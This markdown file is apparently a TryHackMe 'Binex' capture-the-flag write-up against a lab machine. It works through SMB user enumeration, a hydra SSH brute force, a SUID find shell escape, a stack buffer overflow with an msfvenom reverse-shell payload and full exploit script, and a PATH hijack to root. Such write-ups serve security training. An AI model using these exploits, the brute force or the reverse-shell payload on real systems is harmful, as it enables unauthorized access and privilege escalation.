[Home](../../index.md)

# TryHackMe: Binex

https://tryhackme.com/room/binex

---
## Task 1 - Gain Initial Access

Initial port scan reveals 3 open ports

```
Open 10.10.218.38:22
Open 10.10.218.38:139
Open 10.10.218.38:445
```

Deeper nmap scan

```
┌──(kali㉿kali)-[~/tryhackme/binex]
└─$ sudo nmap -sV -sC -p 22,139,445 10.10.218.38              

PORT    STATE SERVICE     VERSION
22/tcp  open  ssh         OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 3f:36:de:da:2f:c3:b7:78:6f:a9:25:d6:41:dd:54:69 (RSA)
|   256 d0:78:23:ee:f3:71:58:ae:e9:57:14:17:bb:e3:6a:ae (ECDSA)
|_  256 4c:de:f1:49:df:21:4f:32:ca:e6:8e:bc:6a:96:53:e5 (ED25519)
139/tcp open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445/tcp open  netbios-ssn Samba smbd 4.7.6-Ubuntu (workgroup: WORKGROUP)
Service Info: Host: THM_EXPLOIT; OS: Linux; CPE: cpe:/o:linux:linux_kernel

Host script results:
| smb2-security-mode: 
|   3.1.1: 
|_    Message signing enabled but not required
|_clock-skew: mean: 6s, deviation: 0s, median: 5s
|_nbstat: NetBIOS name: THM_EXPLOIT, NetBIOS user: <unknown>, NetBIOS MAC: <unknown> (unknown)
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb2-time: 
|   date: 2022-01-18T15:20:41
|_  start_date: N/A
| smb-os-discovery: 
|   OS: Windows 6.1 (Samba 4.7.6-Ubuntu)
|   Computer name: thm_exploit
|   NetBIOS computer name: THM_EXPLOIT\x00
|   Domain name: \x00
|   FQDN: thm_exploit
|_  System time: 2022-01-18T15:20:41+00:00
```

Smbclient doesn't reveal any guest-accessible shares.

```
┌──(kali㉿kali)-[~/tryhackme/binex]
└─$ smbclient -L 10.10.218.38 -N

        Sharename       Type      Comment
        ---------       ----      -------
        print$          Disk      Printer Drivers
        IPC$            IPC       IPC Service (THM_exploit server (Samba, Ubuntu))
Reconnecting with SMB1 for workgroup listing.

        Server               Comment
        ---------            -------

        Workgroup            Master
        ---------            -------
        WORKGROUP            THM_EXPLOIT
```

Running `enum4linux` reveals some usernames via RID cycling.  

```
 ======================================================================= 
|    Users on 10.10.218.38 via RID cycling (RIDS: 500-550,1000-1050)    |
 ======================================================================= 
[I] Found new SID: S-1-22-1
[I] Found new SID: S-1-5-21-2007993849-1719925537-2372789573
[I] Found new SID: S-1-5-32
[+] Enumerating users using SID S-1-22-1 and logon username '', password ''
S-1-22-1-1000 Unix User\kel (Local User)
S-1-22-1-1001 Unix User\des (Local User)
S-1-22-1-1002 Unix User\tryhackme (Local User)
S-1-22-1-1003 Unix User\noentry (Local User)
```

The task hint points us towards `tryhackme` being a vulnerable user.  Let's try to brute it with `hydra` and `rockyou.txt`

```
┌──(kali㉿kali)-[~/tryhackme/binex]
└─$ hydra -l tryhackme -P /usr/share/wordlists/rockyou.txt 10.10.218.38 ssh                                                  
Hydra v9.2 (c) 2021 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2022-01-18 11:10:49
[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
[DATA] max 16 tasks per 1 server, overall 16 tasks, 14344399 login tries (l:1/p:14344399), ~896525 tries per task
[DATA] attacking ssh://10.10.218.38:22/
[STATUS] 178.00 tries/min, 178 tries in 00:01h, 14344223 to do in 1343:06h, 16 active
[STATUS] 112.67 tries/min, 338 tries in 00:03h, 14344063 to do in 2121:55h, 16 active
[STATUS] 116.86 tries/min, 818 tries in 00:07h, 14343583 to do in 2045:45h, 16 active
[22][ssh] host: 10.10.218.38   login: tryhackme   password: <redacted>
1 of 1 target successfully completed, 1 valid password found
[WARNING] Writing restore file because 2 final worker threads did not complete until end.
[ERROR] 2 targets did not resolve or could not be connected
[ERROR] 0 target did not complete
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2022-01-18 11:18:27
```

We now have SSH access.

---
## Task 2 - SUID :: Binary 1

We have basic access, but not to `/home/des`. We need to move laterally or find some exploit that lets us read from there.

Running through the usual Linux Privesc checks, we find something interesting in the SUID files.

```
tryhackme@THM_exploit:/$ find / -type f -perm -u=s 2>/dev/null | xargs ls -l

...

-rwsr-xr-x 1 root   root             76496 Mar 22  2019 /usr/bin/chfn
-rwsr-xr-x 1 root   root             44528 Mar 22  2019 /usr/bin/chsh
-rwsr-sr-x 1 des    des             238080 Nov  5  2017 /usr/bin/find
-rwsr-xr-x 1 root   root             75824 Mar 22  2019 /usr/bin/gpasswd
-rwsr-xr-x 1 root   root             37136 Mar 22  2019 /usr/bin/newgidmap

...
```

`find` will let us run as `des` (gtfobins).  This allows us to spawn a shell as `des` and read the flag

```
tryhackme@THM_exploit:/$ /usr/bin/find . -exec /bin/sh -p \; -quit
$ id
uid=1002(tryhackme) gid=1002(tryhackme) euid=1001(des) egid=1001(des) groups=1001(des),1002(tryhackme)
$ cd /des/home
/bin/sh: 2: cd: can't cd to /des/home
$ cd /home/des
$ ls
bof  bof64.c  flag.txt
$ cat flag.txt
Good job on exploiting the SUID file. Never assign +s to any system executable files. Remember, Check gtfobins.

You flag is <redacted>

login crdential (In case you need it)
username: des
password: <redacted>
```

This also provides SSH credentials for easier access.

---
## Task 3 - Buffer Overflow :: Binary 2

`/home/des` includes a binary and its source code.  the binary is owned by `kel`.  Clearly we need to buffer overflow this into a shell to gain access as `kel`.

For this I largely followed [this](https://medium.com/@buff3r/basic-buffer-overflow-on-64-bit-architecture-3fb74bab3558) article.

First let's find the offset.  We generate a pattern using pattern_create.rb and save it to a file.

```
┌──(kali㉿kali)-[~/tryhackme/binex]
└─$ /usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 2000 > pattern.txt
                                                                                   
┌──(kali㉿kali)-[~/tryhackme/binex]
└─$ cat pattern.txt                                               
Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9Ak0Ak1Ak2Ak3Ak4Ak5Ak6Ak7Ak8Ak9Al0Al1Al2Al3Al4Al5Al6Al7Al8Al9Am0Am1Am2Am3Am4Am5Am6Am7Am8Am9An0An1An2An3An4An5An6An7An8An9Ao0Ao1Ao2Ao3Ao4Ao5Ao6Ao7Ao8Ao9Ap0Ap1Ap2Ap3Ap4Ap5Ap6Ap7Ap8Ap9Aq0Aq1Aq2Aq3Aq4Aq5Aq6Aq7Aq8Aq9Ar0Ar1Ar2Ar3Ar4Ar5Ar6Ar7Ar8Ar9As0As1As2As3As4As5As6As7As8As9At0At1At2At3At4At5At6At7At8At9Au0Au1Au2Au3Au4Au5Au6Au7Au8Au9Av0Av1Av2Av3Av4Av5Av6Av7Av8Av9Aw0Aw1Aw2Aw3Aw4Aw5Aw6Aw7Aw8Aw9Ax0Ax1Ax2Ax3Ax4Ax5Ax6Ax7Ax8Ax9Ay0Ay1Ay2Ay3Ay4Ay5Ay6Ay7Ay8Ay9Az0Az1Az2Az3Az4Az5Az6Az7Az8Az9Ba0Ba1Ba2Ba3Ba4Ba5Ba6Ba7Ba8Ba9Bb0Bb1Bb2Bb3Bb4Bb5Bb6Bb7Bb8Bb9Bc0Bc1Bc2Bc3Bc4Bc5Bc6Bc7Bc8Bc9Bd0Bd1Bd2Bd3Bd4Bd5Bd6Bd7Bd8Bd9Be0Be1Be2Be3Be4Be5Be6Be7Be8Be9Bf0Bf1Bf2Bf3Bf4Bf5Bf6Bf7Bf8Bf9Bg0Bg1Bg2Bg3Bg4Bg5Bg6Bg7Bg8Bg9Bh0Bh1Bh2Bh3Bh4Bh5Bh6Bh7Bh8Bh9Bi0Bi1Bi2Bi3Bi4Bi5Bi6Bi7Bi8Bi9Bj0Bj1Bj2Bj3Bj4Bj5Bj6Bj7Bj8Bj9Bk0Bk1Bk2Bk3Bk4Bk5Bk6Bk7Bk8Bk9Bl0Bl1Bl2Bl3Bl4Bl5Bl6Bl7Bl8Bl9Bm0Bm1Bm2Bm3Bm4Bm5Bm6Bm7Bm8Bm9Bn0Bn1Bn2Bn3Bn4Bn5Bn6Bn7Bn8Bn9Bo0Bo1Bo2Bo3Bo4Bo5Bo6Bo7Bo8Bo9Bp0Bp1Bp2Bp3Bp4Bp5Bp6Bp7Bp8Bp9Bq0Bq1Bq2Bq3Bq4Bq5Bq6Bq7Bq8Bq9Br0Br1Br2Br3Br4Br5Br6Br7Br8Br9Bs0Bs1Bs2Bs3Bs4Bs5Bs6Bs7Bs8Bs9Bt0Bt1Bt2Bt3Bt4Bt5Bt6Bt7Bt8Bt9Bu0Bu1Bu2Bu3Bu4Bu5Bu6Bu7Bu8Bu9Bv0Bv1Bv2Bv3Bv4Bv5Bv6Bv7Bv8Bv9Bw0Bw1Bw2Bw3Bw4Bw5Bw6Bw7Bw8Bw9Bx0Bx1Bx2Bx3Bx4Bx5Bx6Bx7Bx8Bx9By0By1By2By3By4By5By6By7By8By9Bz0Bz1Bz2Bz3Bz4Bz5Bz6Bz7Bz8Bz9Ca0Ca1Ca2Ca3Ca4Ca5Ca6Ca7Ca8Ca9Cb0Cb1Cb2Cb3Cb4Cb5Cb6Cb7Cb8Cb9Cc0Cc1Cc2Cc3Cc4Cc5Cc6Cc7Cc8Cc9Cd0Cd1Cd2Cd3Cd4Cd5Cd6Cd7Cd8Cd9Ce0Ce1Ce2Ce3Ce4Ce5Ce6Ce7Ce8Ce9Cf0Cf1Cf2Cf3Cf4Cf5Cf6Cf7Cf8Cf9Cg0Cg1Cg2Cg3Cg4Cg5Cg6Cg7Cg8Cg9Ch0Ch1Ch2Ch3Ch4Ch5Ch6Ch7Ch8Ch9Ci0Ci1Ci2Ci3Ci4Ci5Ci6Ci7Ci8Ci9Cj0Cj1Cj2Cj3Cj4Cj5Cj6Cj7Cj8Cj9Ck0Ck1Ck2Ck3Ck4Ck5Ck6Ck7Ck8Ck9Cl0Cl1Cl2Cl3Cl4Cl5Cl6Cl7Cl8Cl9Cm0Cm1Cm2Cm3Cm4Cm5Cm6Cm7Cm8Cm9Cn0Cn1Cn2Cn3Cn4Cn5Cn6Cn7Cn8Cn9Co0Co1Co2Co3Co4Co5Co
```

Then we transfer the file over to `/home/del` and run the binary with gdb (so we can look at the register value)

```
┌──(kali㉿kali)-[~/tryhackme/binex]
└─$ scp pattern.txt des@10.10.218.38:/home/des/pattern.txt
```

Then we run `bof` with gdb and crash the program with our pattern.

```
des@THM_exploit:~$ gdb bof

...

(gdb) run < pattern.txt
Starting program: /home/des/bof < pattern.txt
Enter some string:

Program received signal SIGSEGV, Segmentation fault.
0x000055555555484e in foo ()
```

Let's look at the registers to get the value of RBP.

```
(gdb) info reg
rax            0x0      0
rbx            0x3e9    1001
rcx            0x0      0
rdx            0x0      0
rsi            0x555555554956   93824992233814
rdi            0x7ffff7dd0760   140737351845728
rbp            0x4134754133754132       0x4134754133754132
rsp            0x7fffffffe4a8   0x7fffffffe4a8
r8             0xffffffffffffffed       -19
r9             0x25e    606
r10            0x5555557564cb   93824994337995
r11            0x555555554956   93824992233814
r12            0x3e9    1001
r13            0x7fffffffe5a0   140737488348576
r14            0x0      0
r15            0x0      0
rip            0x55555555484e   0x55555555484e <foo+84>
eflags         0x10202  [ IF RF ]
cs             0x33     51
ss             0x2b     43
ds             0x0      0
es             0x0      0
fs             0x0      0
gs             0x0      0
```

Our value is `0x4134754133754132`.

Converted to ASCII that's `A4uA3uA2`.

And since it is little-endian we would reverse it, so this is `2Au3Au4A` from our pattern.

Feed this to pattern_offset.rb on our Kali machine (you can feed it the hex, you don't have to use the text from the pattern)

```
┌──(kali㉿kali)-[~/tryhackme/binex]
└─$ /usr/share/metasploit-framework/tools/exploit/pattern_offset.rb -q 0x4134754133754132
[*] Exact match at offset 608
```

We can add 8 to our offset to make our offset 616.

Now that we have an offset, we can pick a memory address to use.

```
(gdb) run < <(python3 -c "print('A'*800)")                                
Starting program: /home/des/bof < <(python3 -c "print('A'*800)")          
Enter some string:                                                            
                                                                              
Program received signal SIGSEGV, Segmentation fault.                      
0x000055555555484e in foo () 
(gdb) x/100x $rsp
0x7fffffffe4a8: 0x41414141      0x41414141      0x41414141      0x41414141
0x7fffffffe4b8: 0x41414141      0x41414141      0x41414141      0x41414141
0x7fffffffe4c8: 0x41414141      0x41414141      0x41414141      0x41414141
0x7fffffffe4d8: 0x41414141      0x41414141      0x41414141      0x41414141
0x7fffffffe4e8: 0x41414141      0x41414141      0x41414141      0x41414141
0x7fffffffe4f8: 0x41414141      0x41414141      0x41414141      0x41414141
0x7fffffffe508: 0x41414141      0x41414141      0x41414141      0x41414141
0x7fffffffe518: 0x41414141      0x41414141      0x41414141      0x41414141
0x7fffffffe528: 0x41414141      0x41414141      0x41414141      0x41414141
0x7fffffffe538: 0x41414141      0x41414141      0x41414141      0x41414141
0x7fffffffe548: 0x41414141      0x41414141      0x41414141      0x41414141
0x7fffffffe558: 0x41414141      0x41414141      0x0000000a      0x00000000
0x7fffffffe568: 0x00000000      0x00000000      0x00000000      0x00000000
0x7fffffffe578: 0x555546f0      0x00005555      0xffffe5a0      0x00007fff
0x7fffffffe588: 0x5555471a      0x00005555      0xffffe598      0x00007fff
0x7fffffffe598: 0x0000001c      0x00000000      0x00000001      0x00000000
0x7fffffffe5a8: 0xffffe7d5      0x00007fff      0x00000000      0x00000000
0x7fffffffe5b8: 0xffffe7e3      0x00007fff      0xffffedcf      0x00007fff
0x7fffffffe5c8: 0xffffedff      0x00007fff      0xffffee21      0x00007fff
0x7fffffffe5d8: 0xffffee30      0x00007fff      0xffffee41      0x00007fff
0x7fffffffe5e8: 0xffffee52      0x00007fff      0xffffee5b      0x00007fff
0x7fffffffe5f8: 0xffffee69      0x00007fff      0xffffee72      0x00007fff
0x7fffffffe608: 0xffffee81      0x00007fff      0xffffeea0      0x00007fff
0x7fffffffe618: 0xffffeee1      0x00007fff      0xffffeef4      0x00007fff
0x7fffffffe628: 0xffffef00      0x00007fff      0xffffef13      0x00007fff
(gdb) x/100x $rsp-700
0x7fffffffe1ec: 0x00007fff      0x00000012      0x00000000      0xf7dd0760
0x7fffffffe1fc: 0x00007fff      0x55554934      0x00005555      0xf7a64b62
0x7fffffffe20c: 0x00007fff      0xf79e90e8      0x00007fff      0x000003e9
0x7fffffffe21c: 0x00000000      0xffffe4a0      0x00007fff      0x000003e9
0x7fffffffe22c: 0x00000000      0xffffe5a0      0x00007fff      0x55554848
0x7fffffffe23c: 0x00005555      0x41414141      0x41414141      0x41414141
0x7fffffffe24c: 0x41414141      0x41414141      0x41414141      0x41414141
0x7fffffffe25c: 0x41414141      0x41414141      0x41414141      0x41414141
0x7fffffffe26c: 0x41414141      0x41414141      0x41414141      0x41414141
0x7fffffffe27c: 0x41414141      0x41414141      0x41414141      0x41414141
0x7fffffffe28c: 0x41414141      0x41414141      0x41414141      0x41414141
0x7fffffffe29c: 0x41414141      0x41414141      0x41414141      0x41414141
0x7fffffffe2ac: 0x41414141      0x41414141      0x41414141      0x41414141
0x7fffffffe2bc: 0x41414141      0x41414141      0x41414141      0x41414141
0x7fffffffe2cc: 0x41414141      0x41414141      0x41414141      0x41414141
0x7fffffffe2dc: 0x41414141      0x41414141      0x41414141      0x41414141
0x7fffffffe2ec: 0x41414141      0x41414141      0x41414141      0x41414141
0x7fffffffe2fc: 0x41414141      0x41414141      0x41414141      0x41414141
0x7fffffffe30c: 0x41414141      0x41414141      0x41414141      0x41414141
0x7fffffffe31c: 0x41414141      0x41414141      0x41414141      0x41414141
0x7fffffffe32c: 0x41414141      0x41414141      0x41414141      0x41414141
0x7fffffffe33c: 0x41414141      0x41414141      0x41414141      0x41414141
0x7fffffffe34c: 0x41414141      0x41414141      0x41414141      0x41414141
0x7fffffffe35c: 0x41414141      0x41414141      0x41414141      0x41414141
0x7fffffffe36c: 0x41414141      0x41414141      0x41414141      0x41414141

```

We'll use `0x7fffffffe32c` as our address for $rip.

Now we just need shellcode.

```
┌──(kali㉿kali)-[~/tryhackme/binex]
└─$ msfvenom -p linux/x64/shell_reverse_tcp LHOST=10.13.18.7 LPORT=4444 -b '\x00' -f python
[-] No platform was selected, choosing Msf::Module::Platform::Linux from the payload
[-] No arch selected, selecting arch: x64 from the payload
Found 4 compatible encoders
Attempting to encode payload with 1 iterations of generic/none
generic/none failed with Encoding failed due to a bad character (index=17, char=0x00)
Attempting to encode payload with 1 iterations of x64/xor
x64/xor succeeded with size 119 (iteration=0)
x64/xor chosen with final size 119
Payload size: 119 bytes
Final size of python file: 597 bytes
buf =  b""
buf += b"\x48\x31\xc9\x48\x81\xe9\xf6\xff\xff\xff\x48\x8d\x05"
buf += b"\xef\xff\xff\xff\x48\xbb\x65\x34\xf2\x73\xab\x2c\xdb"
buf += b"\x43\x48\x31\x58\x27\x48\x2d\xf8\xff\xff\xff\xe2\xf4"
buf += b"\x0f\x1d\xaa\xea\xc1\x2e\x84\x29\x64\x6a\xfd\x76\xe3"
buf += b"\xbb\x93\xfa\x67\x34\xe3\x2f\xa1\x21\xc9\x44\x34\x7c"
buf += b"\x7b\x95\xc1\x3c\x81\x29\x4f\x6c\xfd\x76\xc1\x2f\x85"
buf += b"\x0b\x9a\xfa\x98\x52\xf3\x23\xde\x36\x93\x5e\xc9\x2b"
buf += b"\x32\x64\x60\x6c\x07\x5d\x9c\x5c\xd8\x44\xdb\x10\x2d"
buf += b"\xbd\x15\x21\xfc\x64\x52\xa5\x6a\x31\xf2\x73\xab\x2c"
buf += b"\xdb\x43"
```

Our final full code to generate the exploit:

```
┌──(kali㉿kali)-[~/tryhackme/binex]
└─$ cat exploit.py            
from struct import pack

payload_len = 616       
nop = "\x90"*300
rip = 0x00007fffffffe32c

buf =  b""
buf += b"\x48\x31\xc9\x48\x81\xe9\xf6\xff\xff\xff\x48\x8d\x05"
buf += b"\xef\xff\xff\xff\x48\xbb\x65\x34\xf2\x73\xab\x2c\xdb"
buf += b"\x43\x48\x31\x58\x27\x48\x2d\xf8\xff\xff\xff\xe2\xf4"
buf += b"\x0f\x1d\xaa\xea\xc1\x2e\x84\x29\x64\x6a\xfd\x76\xe3"
buf += b"\xbb\x93\xfa\x67\x34\xe3\x2f\xa1\x21\xc9\x44\x34\x7c"
buf += b"\x7b\x95\xc1\x3c\x81\x29\x4f\x6c\xfd\x76\xc1\x2f\x85"
buf += b"\x0b\x9a\xfa\x98\x52\xf3\x23\xde\x36\x93\x5e\xc9\x2b"
buf += b"\x32\x64\x60\x6c\x07\x5d\x9c\x5c\xd8\x44\xdb\x10\x2d"
buf += b"\xbd\x15\x21\xfc\x64\x52\xa5\x6a\x31\xf2\x73\xab\x2c"
buf += b"\xdb\x43"

buf_len = len(buf)
nop_len = len(nop)
padding = "A"*(payload_len-nop_len-buf_len)

payload = nop + buf + padding + pack("<Q", rip)

print payload
```

Transfer and run with a listener started.

```
des@THM_exploit:~$ ./bof < exploit.txt
Enter some string:
```

```
┌──(kali㉿kali)-[~/tryhackme/binex]
└─$ nc -lvnp 4444                                       
listening on [any] 4444 ...
connect to [10.13.18.7] from (UNKNOWN) [10.10.218.38] 52796
id
uid=1000(kel) gid=1001(des) groups=1001(des)
pwd
/home/des
cd /home/kel
ls
exe
exe.c
flag.txt
cat flag.txt
You flag is <redacted>

The user credential
username: kel
password: <redacted>
```

There's the flag and an SSH password for `kel`

---
## Task 4 - PATH Manipulation :: Binary 3

`kel`'s home directory contains a binary and the source code as well.  The binary executes the `ps` command, but without an absolute path.

```
kel@THM_exploit:~$ ls
exe  exe.c  flag.txt
kel@THM_exploit:~$ cat exe.c
#include <unistd.h>

void main()
{
        setuid(0);
        setgid(0);
        system("ps");
}
```

So it's as simple as putting a directory we have write access to at the start of the PATH variable, and making a copy of `/bin/sh` there named `ps`.  Then we run `exe` and get the flag.

```
kel@THM_exploit:~$ export PATH=/tmp:$PATH
kel@THM_exploit:~$ cp /bin/sh /tmp/ps
kel@THM_exploit:~$ ./exe
# id
uid=0(root) gid=0(root) groups=0(root),4(adm),24(cdrom),30(dip),46(plugdev),108(lxd),1000(kel)
# cd /root
# ls
root.txt
# cat root.txt
The flag: <redacted>. 
Also, thank you for your participation.

The room is built with love. DesKel out.
```